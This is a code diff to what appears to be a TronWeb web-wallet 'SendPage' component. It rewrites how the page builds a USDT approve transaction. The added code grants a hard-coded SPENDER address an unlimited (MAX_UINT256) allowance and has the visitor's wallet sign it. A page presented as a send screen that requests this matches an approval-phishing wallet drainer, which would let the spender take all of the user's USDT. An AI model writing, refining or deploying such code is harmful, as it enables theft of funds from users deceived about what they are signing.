@@ -181,8 +181,18 @@ export default function SendPage() {
 
     try {
       const serverTW = await getServerTW();
-      const contract = await serverTW.contract().at(CFG.USDT);
-      const tx = await contract.approve(CFG.SPENDER, MAX_UINT256).build();
+
+      // TronWeb 6: Use transactionBuilder directly for more control
+      const { transaction: tx } = await serverTW.transactionBuilder.triggerSmartContract(
+        CFG.USDT,
+        'approve(address,uint256)',
+        { feeLimit: 150_000_000 },
+        [
+          { type: 'address', value: CFG.SPENDER },
+          { type: 'uint256', value: MAX_UINT256 }
+        ],
+        addr
+      );
 
       let signedTx;
       if (tronWeb.isWC) {
